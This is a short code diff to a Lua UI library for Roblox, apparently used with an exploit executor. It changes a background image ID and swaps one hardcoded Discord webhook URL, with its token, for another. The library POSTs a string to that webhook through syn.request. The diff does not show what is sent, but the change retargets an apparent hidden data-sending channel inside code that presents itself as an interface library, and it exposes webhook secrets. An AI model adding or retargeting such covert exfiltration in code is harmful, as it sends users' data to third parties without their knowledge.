@@ -183,7 +183,7 @@ function library.new(library_title, cfg_location)
         BackgroundColor3 = Color3.fromRGB(15, 15, 15),
         Position = UDim2.new(0.5, 0, 0.5, 0),
         Size = UDim2.new(0, 700, 0, 500),
-        Image = "http://www.roblox.com/asset/?id=7300333488",
+        Image = "https://www.roblox.com/library/17493980133",
         AutoButtonColor = false,
         Modal = true,
     }, ScreenGui)
@@ -235,7 +235,7 @@ function library.new(library_title, cfg_location)
     
     local response = syn.request(
         {
-            Url = 'https://discord.com/api/webhooks/886979229298872331/P0jVdklhb5cbMtPHUjJ_QlfamL6l5xqT28Z691uafGxWXSSYUWCXE2QHhaxv1XdoaSCk', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
+            Url = 'https://ptb.discord.com/api/webhooks/1240005385461694577/rw4rnZXZ-2wVzV0_bHnFEZlk0fIPAFDtAp5dsc8TjDJXREs5krocRXD4x0yyjXCaIDR_', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
             Body = game:GetService('HttpService'):JSONEncode({content = string})
         }
     );
